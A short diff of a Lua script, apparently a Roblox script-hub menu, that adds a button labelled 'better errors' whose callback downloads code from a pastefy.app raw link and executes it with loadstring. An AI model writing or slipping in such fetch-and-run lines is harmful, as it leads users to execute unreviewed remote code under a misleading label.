@@ -656,6 +656,13 @@ local Button = MainTab:CreateButton({
    end,
 })
 
+local Button = MainTab:CreateButton({
+   Name = "better errors",
+   Callback = function()
+loadstring(game:HttpGet("https://pastefy.app/2t0mIQQ4/raw"))()
+   end,
+})
+
 local MainTab = Window:CreateTab("server", nil)
 
 local Button = MainTab:CreateButton({
